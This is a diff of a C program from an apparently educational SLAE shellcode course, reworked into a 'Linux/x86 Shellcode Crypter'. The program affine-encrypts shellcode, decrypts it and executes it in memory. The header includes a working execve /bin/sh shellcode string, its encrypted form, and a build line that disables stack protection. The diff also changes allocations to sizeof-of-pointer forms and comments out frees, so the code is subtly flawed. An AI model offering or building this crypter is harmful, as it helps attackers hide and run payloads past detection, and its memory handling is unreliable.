@@ -1,9 +1,20 @@
 /*
-* Affine Cipher - Assignment 7
+* Title: Linux/x86 - Shellcode Crypter 
+* Date: 15.05.2019
+* Author: Xenofon Vassilakopoulos 
+* github : @xvass
+* Homepage : https://xenovass.wordpress.com/2019/05/15/slae-assignment-7-create-a-custom-crypter/ 
+* Tested on: 
+* - Linux kali 4.19.0-kali5-686-pae #1 SMP Debian 4.19.37-1kali1 (2019-05-09) i686 GNU/Linux
+* Description: Crypter which encrypts, decrypts and executes execve shellcode using Affine cipher
+* Version : 1.0.1
+* gcc -m32 -fno-stack-protector -z execstack affine.c -o affine
+* 
+* Usage : 
 *
-* Author: Xenofon Vassilakopoulos
+* encryption -> ./affine -e \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
 *
-* Student ID: SLAE-1314
+* decryption -> ./affine -d \x07\x7d\x77\x78\x11\x78\x16\x20\x02\x06\x02\x06\x1b\x07\x16\x20\x16\x20\x02\x06\x16\x02\x16\x25\x16\x01\x20\x25\x01\x07\x11\x78\x20\x25\x01\x02\x11\x07\x20\x25\x01\x7d\x72\x78\x78\x72\x77\x7c\x20\x78
 */
 
 #include <stdlib.h>
@@ -19,51 +30,57 @@
 char *hexToStrip(char *shellcode, size_t si)
 {
 size_t s = strlen(shellcode);
-char *buf = (char*)malloc((s + 1) * sizeof(char));
-char *stringToStrip = (char*)malloc((s + 1) * sizeof(char));
+char *buf = (char*)malloc((s + 1) * sizeof(buf));
+char *stringToStrip = (char*)malloc((s + 1) * sizeof(stringToStrip));
 strcpy(stringToStrip,shellcode);
 size_t stringLen = strlen(stringToStrip);
 unsigned int i,j = 0;
+
 char currentChar;
+
 for (j = 0; j<stringLen+1;  j++) {
     currentChar = stringToStrip[j];
-      if (currentChar != '\\' && currentChar != 'x')
-      {
-              sprintf(buf + strlen(buf),"%c",currentChar);
-      }
+    if (currentChar != '\\' && currentChar != 'x')
+    {
+         sprintf(buf + strlen(buf),"%c",currentChar);
+    }
 }
 return buf;
 }
+
 
 /*
 * this function used to convert the shellcode string into hex in order to execute in memory,
 * thus every char of the shellcode must be casted first into integer and then into unsigned char 
 * and also by addinng the \x value between every iteration. 
 */
+
 char *charTohex(char *shellcode, size_t si)
 {
-char *chr = (char*)calloc(si+1 , sizeof(char*));
+char *chr = (char*)calloc(si+1 , sizeof(chr));
 int l;
 for (l=0; l<si; l++) {
-        sprintf(chr + strlen(chr),"\\x%02x", (unsigned char)(int)shellcode[l]);
+       sprintf(chr + strlen(chr),"\\x%02x", (unsigned char)(int)shellcode[l]);
 }
 return chr;
 }
 
-char *hexTochar(const char *shellcode) {
+
+unsigned char *hexTochar(char *shellcode) {
     char *end;
-    long j = strtol(shellcode, &end, 16);
-    char *str = (char*)calloc(strlen(shellcode), sizeof(char*));
+    unsigned long int j = strtol(shellcode, &end, 16);
+    char* str = (char*)calloc(strlen(shellcode), sizeof(str));
     int i=0;
-    while(1){
-    	sprintf(str + i * sizeof(char),"%c", (int)j);
-    	i++;
-    	j = strtol(end, &end, 16);
+    for ( ;; ) {
+        sprintf(str + i * sizeof(char),"%c", (int)j);
+        i++;
+        j = strtol(end, &end, 16);
 	if (j == 0)
-        	break; 
-	}
-return str;
+	    break; 
+    }
+    return str;
 }
+
 
 /*
 * Affine cipher - encryption function
@@ -73,8 +90,8 @@ char *encryption(char* buffer, size_t len)
 int y = 0;
 int x = 0;
 
-char *buf = (char*)malloc((len+1) * sizeof(char*));
-char *buf2 = (char*)malloc((len+1) * sizeof(char*));
+unsigned char *buf =  (unsigned char*)malloc((len+1) * sizeof(buf));
+unsigned char *buf2 = (unsigned char*)malloc((len+1) * sizeof(buf2));
 
 unsigned int k;
 for(k=0; buffer[k]!='\0'; k++)
@@ -88,7 +105,7 @@ for(k=0; buffer[k]!='\0'; k++)
 }
 
 printf("\n");
-free(buf2);
+//free(buf2);
 return buf;
 }
 
@@ -99,9 +116,9 @@ char *decryption(char* shellcode, size_t len)
 {
 unsigned int  k, y1=0,y2=0,x1=0, x2=0;
 
-char *b  =  (char*)malloc((len+1) * sizeof(char*));
-char *b2 =  (char*)malloc((len+1) * sizeof(char*));
-char *b3 =  (char*)malloc((len+1) * sizeof(char*));
+char *b  =  (char*)malloc((len+1) * sizeof(b));
+char *b2 =  (char*)malloc((len+1) * sizeof(b2));
+char *b3 =  (char*)malloc((len+1) * sizeof(b3));
 
 for(k=0; shellcode[k]!='\0'; k+=2)
 {
@@ -115,6 +132,7 @@ for(k=0; shellcode[k]!='\0'; k+=2)
      sprintf(b2 + strlen(b2), "%c%c ", b[k],b[k+1]);
      sprintf(b3 + strlen(b3), "\\x%c%c", b[k],b[k+1]);
 }
+
 memcpy(shellcode, b2, strlen(b2)+1);
 free(b2);
 free(b);
@@ -126,7 +144,7 @@ void message(char *msg)
    printf("\n\n[x] Error: %s \n\n[!] Usage: ./affine <option> <shellcode> \n\nOptions: \n\t -d : Decryption \n\t -e : Encryption\n\n", msg);
 }
 
-unsigned char* toCharByte(char *byte)
+unsigned char* toString(char *byte)
 {
     if (byte == NULL || !strcmp(byte, ""))
     {
@@ -136,13 +154,11 @@ unsigned char* toCharByte(char *byte)
     char cbyte[len];
     strcpy(cbyte, byte);
 
-    char* str = (char*)calloc(len / 3, sizeof(char*));
-    char* chr = (char*)calloc(len / 3 , sizeof(char*));
-    char* alpha = (char*)malloc((len / 3) * sizeof(char));
+    unsigned char* str = (unsigned char*)calloc(len / 3, sizeof(str));
+    unsigned char* chr = (unsigned char*)calloc(len / 3 , sizeof(chr));
+    char* alpha = (char*)malloc((len / 3) * sizeof(alpha));
 
-    char *ch = (char*)malloc((len / 3) * sizeof(char));
-
-    ch = strtok(cbyte, "\\x");
+    char *ch = strtok(cbyte, "\\x");
     while(ch != NULL)
     {
         sprintf(alpha + strlen(alpha), "%s", ch );
@@ -156,7 +172,7 @@ unsigned char* toCharByte(char *byte)
     chr =  hexTochar(str);
     free(str);
     free(alpha);
-    free(ch); 
+    //free(ch); 
     return chr;
 }
 
@@ -169,7 +185,7 @@ if (  argc < 2 || argc < 3  )
         return 1;
 }
 
-unsigned char *shellcode = toCharByte(argv[2]); 
+unsigned char *shellcode = toString(argv[2]); 
 
 if (shellcode != NULL && strncmp(argv[1],"-e",2) == 0)
 {
@@ -183,9 +199,7 @@ char *chr = charTohex(shellcode, si);
 printf("\n%s\n",chr);
 
 char *ptx = hexToStrip(chr, si);
-
 char *ctx = encryption(ptx, strlen(ptx));
-
 printf("\n[-] Encrypted Shellcode:\n\n");
 printf("\n%s\n",ctx);
 size_t l = strlen(ctx) / 4;
@@ -225,7 +239,6 @@ printf("\n[+] Decrypted Shellcode Length = %d\n",strlen(hexfromchr) / 4);
 printf("\n");
 
 //execute the shellcode after decryption
-
 unsigned char* chr = hexTochar(hex);
 
 printf("\n[!] Executing shellcode with length: %d\n\n", strlen(chr));
